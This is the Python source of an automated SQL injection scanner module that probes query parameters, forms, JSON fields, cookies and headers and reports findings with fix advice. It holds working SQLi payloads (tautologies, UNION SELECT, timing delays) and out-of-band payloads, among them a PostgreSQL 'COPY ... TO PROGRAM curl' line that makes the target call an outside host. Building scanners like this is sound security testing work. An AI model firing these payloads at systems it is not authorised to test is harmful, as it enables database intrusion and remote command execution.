"""
SQL Injection Scanner — baseline-aware, statistically-grounded.

Detection pipeline:
  1. Discover insertion points (query params, path segments, cookies, headers, JSON, POST)
  2. Profile each endpoint (5 baseline requests → mean/stdev/stable_text)
  3. Error-based: 250+ SQL error signatures, baseline-subtracted — PER PARAMETER
  4. Boolean-based: true/false pair compared against 3σ natural variance — PER PARAMETER
     with 3-round confirmation (1=1/1=2, 2=2/2=3, OR 1=1/OR 1=2) before CONFIRMED
  5. Time-based: 3 confirmation samples, Mann-Whitney U test, z-score — PER PARAMETER
  6. POST form + JSON body + cookie + header injection — PER FIELD
  7. OOB blind via DNS exfiltration — PER PARAMETER

Critical: each parameter is tested INDEPENDENTLY while all others remain at baseline.
"""

import re
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from secprobe.config import Severity
from secprobe.core.detection import Confidence, VulnType
from secprobe.core.exceptions import TargetUnreachableError, WAFBlockedError
from secprobe.core.insertion_points import (
    InsertionPointDiscovery, InsertionType, InsertionPoint, send_request,
)
from secprobe.scanners.smart_scanner import SmartScanner
from secprobe.utils import normalize_url, print_status, print_finding


def _load_sqli_payloads():
    try:
        from secprobe.payloads import load_payloads_by_section
        sections = load_payloads_by_section("sqli")
        payloads = []
        for section_name, items in sections.items():
            for item in items:
                payloads.append((item, section_name))
        if payloads:
            return payloads
    except Exception:
        pass
    return [
        ("'", "Error-Based"), ('"', "Error-Based"),
        ("' OR '1'='1", "Boolean-Based"), ("' OR '1'='1'--", "Boolean-Based"),
        ("1' ORDER BY 1--", "ORDER BY"), ("1' UNION SELECT NULL--", "UNION-Based"),
        ("' AND SLEEP(3)--", "Time-Based Blind (MySQL)"),
        ("1'; WAITFOR DELAY '0:0:3'--", "Time-Based Blind (MSSQL)"),
        ("' OR pg_sleep(3)--", "Time-Based Blind (PostgreSQL)"),
    ]


# Boolean payload pairs: (true_payload, false_payload, description)
BOOLEAN_PAIRS = [
    ("' OR '1'='1'--", "' OR '1'='2'--", "OR 1=1 vs 1=2"),
    ("' OR 1=1--", "' OR 1=2--", "OR numeric"),
    ("1 OR 1=1", "1 OR 1=2", "Numeric OR"),
    ("1' AND 1=1--", "1' AND 1=2--", "AND 1=1 vs 1=2"),
    ("admin'--", "admin' AND '1'='2'--", "Comment vs false"),
]

# Time-based payloads: (payload, expected_delay, description)
TIME_PAYLOADS = [
    ("' AND SLEEP(3)--", 3.0, "MySQL SLEEP"),
    ("'; WAITFOR DELAY '0:0:3'--", 3.0, "MSSQL WAITFOR"),
    ("' OR pg_sleep(3)--", 3.0, "PostgreSQL pg_sleep"),
    ("' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--", 3.0, "MySQL subquery SLEEP"),
    ("1; SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',3) FROM DUAL--", 3.0, "Oracle DBMS_PIPE"),
    ("' AND SLEEP(3) AND '1'='1", 3.0, "MySQL SLEEP (no comment)"),
]


class SQLiScanner(SmartScanner):
    name = "SQLi Scanner"
    description = "Test for SQL Injection vulnerabilities"

    def scan(self):
        url = normalize_url(self.config.target)
        print_status(f"Testing SQL injection on {url}", "progress")

        all_payloads = _load_sqli_payloads()
        print_status(f"Loaded {len(all_payloads)} SQLi payloads", "info")

        # ── Initialize detection engine ──────────────────────────────
        engine = self._init_detection_engine()

        # Get baseline response
        try:
            baseline_resp = self.http_client.get(url)
        except TargetUnreachableError as e:
            print_status(f"Cannot reach target: {e}", "error")
            self.result.error = str(e)
            return

        # ── Discover ALL insertion points ────────────────────────────
        discovery = InsertionPointDiscovery(
            http_client=self.http_client,
            include_headers=True,
            include_cookies=True,
            include_paths=True,
        )

        # Gather test URLs from crawler + target
        test_urls = self._build_test_urls(url)
        if self.context:
            for u in self.context.get_injection_urls():
                if u not in test_urls:
                    test_urls.append(u)

        if not test_urls:
            test_urls = [
                f"{url}?id=1", f"{url}?page=1",
                f"{url}?q=test", f"{url}?search=test",
            ]

        # Discover forms
        forms = self._discover_forms(url)
        if self.context:
            forms.extend(self.context.get_injectable_forms())

        # Build insertion points from all sources
        all_points: list[InsertionPoint] = []
        for test_url in test_urls:
            points = discovery.discover(test_url, response=baseline_resp, forms=forms)
            all_points.extend(points)

        # Separate by type for phased testing
        param_points = [p for p in all_points if p.type in (
            InsertionType.QUERY_PARAM, InsertionType.PATH_SEGMENT)]
        form_points = [p for p in all_points if p.type == InsertionType.POST_PARAM]
        json_points = [p for p in all_points if p.type == InsertionType.JSON_FIELD]
        cookie_points = [p for p in all_points if p.type == InsertionType.COOKIE]
        header_points = [p for p in all_points if p.type == InsertionType.HEADER]

        total_points = len(all_points)
        print_status(f"Discovered {total_points} insertion points "
                     f"({len(param_points)} params, {len(form_points)} forms, "
                     f"{len(json_points)} JSON, {len(cookie_points)} cookies, "
                     f"{len(header_points)} headers)", "info")

        # ── Profile each unique endpoint ─────────────────────────────
        profiled = set()
        for test_url in test_urls:
            base_url = test_url.split("?")[0]
            if base_url not in profiled:
                parsed = urlparse(test_url)
                params = parse_qs(parsed.query, keep_blank_values=True)
                engine.profile(test_url, params=params)
                profiled.add(base_url)

        # Track which (endpoint, param) combos already have findings to avoid duplicates
        found_vulns = set()

        # ── Detect target technology for DB-specific prioritization ──
        baseline_tech = self.detect_technology(baseline_resp.text)
        if baseline_tech:
            print_status(f"Technology detected: {', '.join(baseline_tech)}", "info")

        # ── Check baseline for error leakage (SmartScanner) ──────────
        baseline_errors = self.detect_errors(baseline_resp.text)
        if baseline_errors:
            print_status(f"Baseline error patterns detected: {len(baseline_errors)}", "info")
            for err in baseline_errors[:3]:
                self.add_finding(
                    title=f"Information Disclosure: Error in baseline response",
                    severity=Severity.LOW,
                    description=(
                        f"Error pattern detected in normal response (no injection).\n"
                        f"Pattern: {err.get('pattern', 'unknown')}\n"
                        f"This may reveal database type or internal paths."
                    ),
                    recommendation="Disable detailed error messages in production.",
                    evidence=f"URL: {url}\nError type: {err.get('type', 'unknown')}",
                    category="Information Disclosure",
                    url=url,
                    cwe="CWE-209",
                )

        # ── Phase 1: Error-based — PER PARAMETER ────────────────────
        print_status("Phase 1: Error-based SQL injection (per-parameter isolation)", "progress")
        for point in param_points:
            point_key = (point.base_url.split("?")[0], point.name)
            if point_key in found_vulns:
                continue

            for payload, payload_desc in all_payloads:
                if self.config.rate_limit:
                    time.sleep(self.config.rate_limit)

                test_payloads = self._evade_payload(payload, vuln_type="sqli")
                for p in test_payloads:
                    spec = point.inject(p, mode="append")
                    try:
                        resp = send_request(self.http_client, spec, allow_redirects=False)
                    except WAFBlockedError:
                        continue
                    except Exception:
                        continue

                    result = engine.test_error_based(
                        url=spec.url,
                        parameter=point.name,
                        payload=p,
                        response_text=resp.text,
                        response_status=resp.status_code,
                        response_size=len(resp.text),
                        vuln_category="sqli",
                    )

                    if result.confidence >= Confidence.FIRM:
                        # ── Verify with SmartScanner before reporting ─
                        verification = self.verify_finding(
                            url=spec.url, param=point.name,
                            payload=p, vuln_type="sqli_error",
                            error_pattern=r"SQL syntax|mysql_|ORA-\d+|pg_query|sqlite3|SQLSTATE",
                        )
                        found_vulns.add(point_key)
                        if verification.confirmed:
                            sev = Severity.CRITICAL
                            self.add_verified_finding(
                                title=f"Verified SQL Injection - Error-based ({payload_desc})",
                                severity=sev,
                                description=(
                                    f"SQL error VERIFIED in parameter '{point.name}' "
                                    f"(confidence: {verification.confidence.name}).\n"
                                    f"Injection point: {point.display_name}\n"
                                    f"Payload: {p[:80]}\n"
                                    f"Evidence: {'; '.join(result.evidence[:2])}"
                                ),
                                confidence=verification.confidence,
                                verification_evidence=verification.evidence,
                                recommendation="Use parameterized queries / prepared statements.",
                                category="SQL Injection",
                                url=spec.url,
                                cwe="CWE-89",
                            )
                            print_finding(sev, f"Verified Error SQLi: {point.name} ({verification.confidence.name})")
                        else:
                            sev = Severity.CRITICAL if result.confidence >= Confidence.CONFIRMED else Severity.HIGH
                            self.add_finding(
                                title=f"SQL Injection - Error-based ({payload_desc})",
                                severity=sev,
                                description=(
                                    f"SQL error detected in parameter '{point.name}' "
                                    f"(confidence: {result.confidence.name}).\n"
                                    f"Injection point: {point.display_name}\n"
                                    f"Payload: {p[:80]}\n"
                                    f"Evidence: {'; '.join(result.evidence[:2])}"
                                ),
                                recommendation="Use parameterized queries / prepared statements.",
                                evidence=(
                                    f"URL: {spec.url}\n"
                                    f"Parameter: {point.name} ({point.type.value})\n"
                                    f"Matched: {'; '.join(result.matched_patterns[:2])}\n"
                                    f"Score: {result.score_breakdown.get('total', 0)}"
                                ),
                                category="SQL Injection",
                                url=spec.url,
                                cwe="CWE-89",
                            )
                            print_finding(sev, f"Error-based SQLi: {point.name} ({result.confidence.name})")
                        break  # Move to next point
                else:
                    continue
                break  # Found a vuln for this point, move on

        # ── Phase 2: Boolean-based with 3-round confirmation ─────────
        print_status("Phase 2: Boolean-based SQL injection (3-round confirmation)", "progress")
        for point in param_points:
            point_key = (point.base_url.split("?")[0], point.name)
            if point_key in found_vulns:
                continue

            for true_payload, false_payload, desc in BOOLEAN_PAIRS:
                if self.config.rate_limit:
                    time.sleep(self.config.rate_limit)

                true_spec = point.inject(true_payload, mode="append")
                false_spec = point.inject(false_payload, mode="append")

                try:
                    true_resp = send_request(self.http_client, true_spec, allow_redirects=False)
                    false_resp = send_request(self.http_client, false_spec, allow_redirects=False)
                except Exception:
                    continue

                result = engine.test_boolean(
                    url=point.base_url,
                    parameter=point.name,
                    true_response=true_resp.text,
                    false_response=false_resp.text,
                    true_size=len(true_resp.text),
                    false_size=len(false_resp.text),
                    payload_desc=f"Boolean: {desc}",
                )

                if result.confidence >= Confidence.FIRM:
                    # ── 3-Round Confirmation ──────────────────────
                    confirmed = self._confirm_boolean(engine, point, desc)
                    if confirmed:
                        # ── Additional SmartScanner verification ──
                        verification = self.verify_finding(
                            url=point.base_url, param=point.name,
                            payload=true_payload, vuln_type="sqli_boolean",
                            false_payload=false_payload,
                        )
                        found_vulns.add(point_key)
                        if verification.confirmed:
                            self.add_verified_finding(
                                title=f"Verified SQL Injection - Boolean-based ({desc})",
                                severity=Severity.CRITICAL,
                                description=(
                                    f"Boolean injection VERIFIED in parameter '{point.name}' "
                                    f"after 3-round + SmartScanner verification.\n"
                                    f"Injection point: {point.display_name}\n"
                                    f"Confidence: {verification.confidence.name}\n"
                                    f"{'; '.join(result.evidence)}"
                                ),
                                confidence=verification.confidence,
                                verification_evidence=verification.evidence,
                                recommendation="Use parameterized queries.",
                                category="SQL Injection",
                                url=point.base_url,
                                cwe="CWE-89",
                            )
                            print_finding(Severity.CRITICAL, f"Verified Boolean SQLi: {point.name}")
                        else:
                            self.add_finding(
                                title=f"SQL Injection - Boolean-based CONFIRMED ({desc})",
                                severity=Severity.CRITICAL,
                                description=(
                                    f"Boolean injection CONFIRMED in parameter '{point.name}' "
                                    f"after 3-round verification.\n"
                                    f"Injection point: {point.display_name}\n"
                                    f"{'; '.join(result.evidence)}"
                                ),
                                recommendation="Use parameterized queries.",
                                evidence=(
                                    f"Parameter: {point.name} ({point.type.value})\n"
                                    f"Confirmation: 3/3 rounds passed\n"
                                    f"Score: {result.score_breakdown}"
                                ),
                                category="SQL Injection",
                                url=point.base_url,
                                cwe="CWE-89",
                            )
                            print_finding(Severity.CRITICAL, f"Boolean SQLi CONFIRMED: {point.name}")
                    else:
                        found_vulns.add(point_key)
                        self.add_finding(
                            title=f"SQL Injection - Boolean-based ({desc})",
                            severity=Severity.HIGH,
                            description=(
                                f"Boolean condition changes response in parameter '{point.name}' "
                                f"(confidence: {result.confidence.name}).\n"
                                f"Note: 3-round confirmation was inconclusive.\n"
                                f"{'; '.join(result.evidence)}"
                            ),
                            recommendation="Use parameterized queries.",
                            evidence=(
                                f"Parameter: {point.name} ({point.type.value})\n"
                                f"Score: {result.score_breakdown}"
                            ),
                            category="SQL Injection",
                            url=point.base_url,
                            cwe="CWE-89",
                        )
                        print_finding(Severity.HIGH, f"Boolean SQLi: {point.name} ({result.confidence.name})")
                    break

        # ── Phase 3: Time-based blind — PER PARAMETER ───────────────
        print_status("Phase 3: Time-based blind SQL injection (per-parameter)", "progress")
        for point in param_points:
            point_key = (point.base_url.split("?")[0], point.name)
            if point_key in found_vulns:
                continue

            for payload, expected_delay, desc in TIME_PAYLOADS:
                if self.config.rate_limit:
                    time.sleep(self.config.rate_limit)

                spec = point.inject(payload, mode="append")

                result = engine.test_timing(
                    url=spec.url,
                    parameter=point.name,
                    payload=payload,
                    method="GET",
                    expected_delay=expected_delay,
                )

                if result.confidence >= Confidence.FIRM:
                    # ── SmartScanner timing verification ──────────
                    verification = self.verify_finding(
                        url=spec.url, param=point.name,
                        payload=payload, vuln_type="sqli_timing",
                        delay_seconds=expected_delay,
                    )
                    found_vulns.add(point_key)
                    if verification.confirmed:
                        self.add_verified_finding(
                            title=f"Verified SQL Injection - Time-based blind ({desc})",
                            severity=Severity.CRITICAL,
                            description=(
                                f"Statistical timing VERIFIED injection in parameter '{point.name}' "
                                f"(confidence: {verification.confidence.name}).\n"
                                f"Injection point: {point.display_name}\n"
                                f"{'; '.join(result.evidence)}"
                            ),
                            confidence=verification.confidence,
                            verification_evidence=verification.evidence,
                            recommendation="Use parameterized queries / prepared statements.",
                            category="SQL Injection",
                            url=spec.url,
                            cwe="CWE-89",
                        )
                        print_finding(Severity.CRITICAL, f"Verified Time-blind SQLi: {point.name}")
                    else:
                        sev = Severity.CRITICAL if result.confidence >= Confidence.CONFIRMED else Severity.HIGH
                        self.add_finding(
                            title=f"SQL Injection - Time-based blind ({desc})",
                            severity=sev,
                            description=(
                                f"Statistical timing confirms injection in parameter '{point.name}' "
                                f"(confidence: {result.confidence.name}).\n"
                                f"Injection point: {point.display_name}\n"
                                f"{'; '.join(result.evidence)}"
                            ),
                            recommendation="Use parameterized queries / prepared statements.",
                            evidence=(
                                f"Parameter: {point.name} ({point.type.value})\n"
                                f"URL: {spec.url}\n"
                                f"Timing: {result.score_breakdown}"
                            ),
                            category="SQL Injection",
                            url=spec.url,
                            cwe="CWE-89",
                        )
                        print_finding(sev, f"Time-based blind SQLi: {point.name} ({result.confidence.name})")
                    break

        # ── Phase 4: POST form fields — PER FIELD ───────────────────
        print_status("Phase 4: POST form SQL injection (per-field isolation)", "progress")
        for point in form_points:
            point_key = (point.base_url.split("?")[0], point.name)
            if point_key in found_vulns:
                continue

            engine.profile(point.base_url, method="POST", data=point._baseline_data)

            for payload, payload_desc in all_payloads[:50]:
                if self.config.rate_limit:
                    time.sleep(self.config.rate_limit)

                spec = point.inject(payload, mode="append")
                try:
                    resp = send_request(self.http_client, spec, allow_redirects=False)
                except Exception:
                    continue

                result = engine.test_error_based(
                    url=point.base_url,
                    parameter=point.name,
                    payload=payload,
                    response_text=resp.text,
                    response_status=resp.status_code,
                    vuln_category="sqli",
                )

                if result.confidence >= Confidence.FIRM:
                    found_vulns.add(point_key)
                    sev = Severity.CRITICAL if result.confidence >= Confidence.CONFIRMED else Severity.HIGH
                    self.add_finding(
                        title=f"SQL Injection (POST field) - {payload_desc}",
                        severity=sev,
                        description=(
                            f"SQLi via POST field '{point.name}' at {point.base_url}\n"
                            f"Confidence: {result.confidence.name}\n"
                            f"Evidence: {'; '.join(result.evidence[:2])}"
                        ),
                        recommendation="Use parameterized queries.",
                        evidence=f"Field: {point.name}\nPayload: {payload[:80]}",
                        category="SQL Injection",
                        url=point.base_url,
                        cwe="CWE-89",
                    )
                    print_finding(sev, f"POST SQLi: {point.name} ({result.confidence.name})")
                    break

        # ── Phase 5: JSON body injection — PER FIELD ─────────────────
        print_status("Phase 5: JSON body SQL injection (per-field)", "progress")
        for point in json_points:
            point_key = (point.base_url.split("?")[0], point.name)
            if point_key in found_vulns:
                continue

            for payload, payload_desc in all_payloads[:30]:
                if self.config.rate_limit:
                    time.sleep(self.config.rate_limit)

                spec = point.inject(payload, mode="append")
                try:
                    resp = send_request(self.http_client, spec, allow_redirects=False)
                except Exception:
                    continue

                result = engine.test_error_based(
                    url=point.base_url,
                    parameter=point.name,
                    payload=payload,
                    response_text=resp.text,
                    response_status=resp.status_code,
                    vuln_category="sqli",
                )

                if result.confidence >= Confidence.FIRM:
                    found_vulns.add(point_key)
                    sev = Severity.CRITICAL if result.confidence >= Confidence.CONFIRMED else Severity.HIGH
                    self.add_finding(
                        title=f"SQL Injection (JSON) - {payload_desc}",
                        severity=sev,
                        description=(
                            f"SQLi via JSON field '{point.name}' at {point.base_url}\n"
                            f"Confidence: {result.confidence.name}"
                        ),
                        recommendation="Use parameterized queries.",
                        evidence=f"Field: {point.name}\nPayload: {payload[:80]}",
                        category="SQL Injection",
                        url=point.base_url,
                        cwe="CWE-89",
                    )
                    print_finding(sev, f"JSON SQLi: {point.name}")
                    break

        # ── Phase 6: Cookie injection — PER COOKIE ───────────────────
        print_status("Phase 6: Cookie SQL injection (per-cookie)", "progress")
        for point in cookie_points:
            point_key = ("cookie", point.name)
            if point_key in found_vulns:
                continue

            for payload, payload_desc in all_payloads[:20]:
                if self.config.rate_limit:
                    time.sleep(self.config.rate_limit)

                spec = point.inject(payload, mode="append")
                try:
                    resp = send_request(self.http_client, spec, allow_redirects=False)
                except Exception:
                    continue

                result = engine.test_error_based(
                    url=point.base_url,
                    parameter=f"cookie:{point.name}",
                    payload=payload,
                    response_text=resp.text,
                    response_status=resp.status_code,
                    vuln_category="sqli",
                )

                if result.confidence >= Confidence.FIRM:
                    found_vulns.add(point_key)
                    sev = Severity.CRITICAL if result.confidence >= Confidence.CONFIRMED else Severity.HIGH
                    self.add_finding(
                        title=f"SQL Injection (Cookie) - {point.name}",
                        severity=sev,
                        description=(
                            f"SQLi via cookie '{point.name}'\n"
                            f"Confidence: {result.confidence.name}"
                        ),
                        recommendation="Never use cookie values in SQL queries without parameterization.",
                        evidence=f"Cookie: {point.name}\nPayload: {payload[:80]}",
                        category="SQL Injection",
                        url=point.base_url,
                        cwe="CWE-89",
                    )
                    print_finding(sev, f"Cookie SQLi: {point.name}")
                    break

        # ── Phase 7: Header injection — PER HEADER ───────────────────
        print_status("Phase 7: Header-based SQL injection (per-header)", "progress")
        for point in header_points:
            point_key = ("header", point.name)
            if point_key in found_vulns:
                continue

            for payload, _ in all_payloads[:20]:
                if self.config.rate_limit:
                    time.sleep(self.config.rate_limit)

                spec = point.inject(payload, mode="replace")
                try:
                    resp = send_request(self.http_client, spec, allow_redirects=False)
                except Exception:
                    continue

                result = engine.test_error_based(
                    url=point.base_url,
                    parameter=f"header:{point.name}",
                    payload=payload,
                    response_text=resp.text,
                    response_status=resp.status_code,
                    vuln_category="sqli",
                )

                if result.confidence >= Confidence.FIRM:
                    found_vulns.add(point_key)
                    sev = Severity.CRITICAL if result.confidence >= Confidence.CONFIRMED else Severity.HIGH
                    self.add_finding(
                        title=f"SQL Injection (Header) - {point.name}",
                        severity=sev,
                        description=(
                            f"SQLi via HTTP header '{point.name}'\n"
                            f"Confidence: {result.confidence.name}"
                        ),
                        recommendation="Never use HTTP headers in SQL queries without parameterization.",
                        evidence=f"Header: {point.name}\nPayload: {payload[:80]}",
                        category="SQL Injection",
                        url=point.base_url,
                        cwe="CWE-89",
                    )
                    print_finding(sev, f"Header SQLi: {point.name}")
                    break

        # ── Phase 8: OOB (blind) detection — PER PARAMETER ──────────
        if self.oob_available:
            print_status("Phase 8: OOB blind SQL injection (per-parameter)", "progress")
            oob_injected = 0
            for point in param_points[:10]:
                # MySQL LOAD_FILE
                token = self.oob_generate_token(point.base_url, point.name, "sqli_dns_exfil", "LOAD_FILE")
                cb_url = self.oob_get_url(token)
                p = f"' UNION SELECT LOAD_FILE('{cb_url}')-- -"
                spec = point.inject(p, mode="append")
                try:
                    send_request(self.http_client, spec, allow_redirects=False)
                    oob_injected += 1
                except Exception:
                    pass
                # MSSQL xp_dirtree
                token = self.oob_generate_token(point.base_url, point.name, "sqli_dns_exfil", "xp_dirtree")
                cb_domain = self.oob_get_domain(token)
                p = f"'; EXEC master..xp_dirtree '//{cb_domain}/a'-- -"
                spec = point.inject(p, mode="append")
                try:
                    send_request(self.http_client, spec, allow_redirects=False)
                    oob_injected += 1
                except Exception:
                    pass
                # PostgreSQL COPY
                token = self.oob_generate_token(point.base_url, point.name, "sqli_dns_exfil", "pg_copy")
                cb_url = self.oob_get_url(token)
                p = f"'; COPY (SELECT '') TO PROGRAM 'curl {cb_url}'-- -"
                spec = point.inject(p, mode="append")
                try:
                    send_request(self.http_client, spec, allow_redirects=False)
                    oob_injected += 1
                except Exception:
                    pass
                # Oracle UTL_HTTP
                token = self.oob_generate_token(point.base_url, point.name, "sqli_dns_exfil", "utl_http")
                cb_url = self.oob_get_url(token)
                p = f"' UNION SELECT UTL_HTTP.REQUEST('{cb_url}') FROM DUAL-- -"
                spec = point.inject(p, mode="append")
                try:
                    send_request(self.http_client, spec, allow_redirects=False)
                    oob_injected += 1
                except Exception:
                    pass
            if oob_injected:
                print_status(f"Sent {oob_injected} OOB SQLi payloads, waiting for callbacks...", "progress")
                self.oob_collect_findings(wait_seconds=10)

        # ── Summary ──────────────────────────────────────────────────
        stats = engine.stats
        confirmed_findings = engine.get_findings(min_confidence=Confidence.FIRM)
        if not confirmed_findings:
            print_status(
                f"No confirmed SQL injection. "
                f"(Tested: {stats['total_tested']}, "
                f"Tentative: {stats['tentative']}, "
                f"Rejected: {stats['none']})",
                "success",
            )
            self.add_finding(
                title="No SQL injection detected",
                severity=Severity.INFO,
                description=(
                    f"Automated tests did not detect SQL injection.\n"
                    f"Insertion points tested: {total_points}\n"
                    f"Detection engine stats: {stats}"
                ),
                category="SQL Injection",
            )

    # ── 3-Round Boolean Confirmation ─────────────────────────────
    def _confirm_boolean(self, engine, point: InsertionPoint, desc: str) -> bool:
        """
        3-round confirmation for boolean-based SQLi.
        Round 1: 1=1 vs 1=2  (already passed)
        Round 2: 2=2 vs 2=3
        Round 3: OR 1=1 vs OR 1=2
        Returns True if at least 2 of 3 rounds show differential response.
        """
        confirmation_pairs = [
            ("' AND 2=2--", "' AND 2=3--"),
            ("' OR 3=3--", "' OR 3=4--"),
            ("') AND 4=4--", "') AND 4=5--"),
        ]
        passes = 0
        for true_p, false_p in confirmation_pairs:
            try:
                true_spec = point.inject(true_p, mode="append")
                false_spec = point.inject(false_p, mode="append")
                true_resp = send_request(self.http_client, true_spec, allow_redirects=False)
                false_resp = send_request(self.http_client, false_spec, allow_redirects=False)

                result = engine.test_boolean(
                    url=point.base_url,
                    parameter=point.name,
                    true_response=true_resp.text,
                    false_response=false_resp.text,
                    true_size=len(true_resp.text),
                    false_size=len(false_resp.text),
                    payload_desc=f"Confirmation: {true_p}",
                )
                if result.confidence >= Confidence.FIRM:
                    passes += 1
            except Exception:
                continue
        return passes >= 2

    def _discover_forms(self, url):
        forms = []
        try:
            resp = self.http_client.get(url)
            form_pattern = re.compile(
                r'<form[^>]*action=["\']?([^"\'>\s]*)["\']?[^>]*method=["\']?(\w+)["\']?[^>]*>(.*?)</form>',
                re.IGNORECASE | re.DOTALL,
            )
            for match in form_pattern.finditer(resp.text):
                action = match.group(1) or url
                if not action.startswith("http"):
                    from urllib.parse import urljoin
                    action = urljoin(url, action)
                method = match.group(2)
                form_html = match.group(3)
                fields = {}
                for inp in re.finditer(r'name=["\']([^"\']+)["\'](?:[^>]*value=["\']([^"\']*)["\'])?', form_html):
                    fields[inp.group(1)] = inp.group(2) or "test"
                forms.append({"action": action, "method": method, "fields": fields})
        except Exception:
            pass
        return forms

    def _build_test_urls(self, url):
        parsed = urlparse(url)
        if parsed.query:
            return [url]
        return []
